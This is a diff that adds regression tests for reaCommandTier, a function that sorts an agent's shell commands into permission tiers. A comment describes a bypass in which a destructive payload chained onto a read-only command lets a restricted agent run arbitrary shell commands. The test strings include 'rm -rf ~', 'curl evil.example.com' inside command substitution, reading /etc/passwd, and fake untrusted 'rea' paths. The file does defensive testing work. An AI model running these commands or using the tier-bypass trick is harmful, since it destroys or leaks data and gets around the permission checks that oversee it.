@@ -106,3 +106,59 @@ describe('reaCommandTier — non-rea commands', () => {
     expect(reaCommandTier('npx')).toBeNull();
   });
 });
+
+/**
+ * Codex HIGH regression — shell-metachar tier bypass.
+ *
+ * Before the fix, `reaCommandTier()` looked at tokens[0] after splitting on
+ * whitespace. A command like `rea check && rm -rf ~` had tokens[0]='rea'
+ * and tokens[1]='check', so the helper returned Read — downgrading the
+ * entire Bash invocation (including the `&& rm -rf ~` payload) from the
+ * generic Write tier. At L0 that would convert a read-only agent into an
+ * effectively-unrestricted shell.
+ *
+ * The fix: refuse to classify any command that contains shell metacharacters
+ * that would let the attacker chain commands, pipe data out, substitute,
+ * or background. Null forces the generic Bash Write default.
+ */
+describe('reaCommandTier — shell-metacharacter bypass (Codex HIGH)', () => {
+  it.each([
+    // Chain operators
+    'rea check && touch /tmp/pwned',
+    'rea check || rm -rf ~',
+    'rea check ; rm -rf ~',
+    // Pipe
+    'rea cache check abc | cat > /tmp/leak',
+    // Background
+    'rea check & curl evil.example.com',
+    // Command substitution
+    'rea check $(curl evil.example.com)',
+    'rea check `curl evil.example.com`',
+    // Process substitution
+    'rea check >(tee /tmp/leak)',
+    'rea check <(cat /etc/passwd)',
+    // Embedded newline
+    'rea check\ntouch /tmp/pwned',
+    'rea check\rcarriage-return',
+  ])('returns null for "%s"', (cmd) => {
+    expect(reaCommandTier(cmd)).toBeNull();
+  });
+
+  it.each([
+    // Untrusted executables whose name happens to end with -rea or /rea
+    // in a non-sanctioned location.
+    '/opt/evil-rea check',
+    '/tmp/not-the-real-rea doctor',
+    './evil-rea freeze',
+  ])('returns null for untrusted path-based "rea" invocations: %s', (cmd) => {
+    expect(reaCommandTier(cmd)).toBeNull();
+  });
+
+  it.each([
+    ['/usr/local/bin/rea doctor', Tier.Read],
+    ['./node_modules/.bin/rea cache check abc', Tier.Read],
+    ['/opt/app/node_modules/.bin/rea audit record codex-review', Tier.Read],
+  ])('keeps classification for trusted paths: %s', (cmd, expected) => {
+    expect(reaCommandTier(cmd)).toBe(expected);
+  });
+});
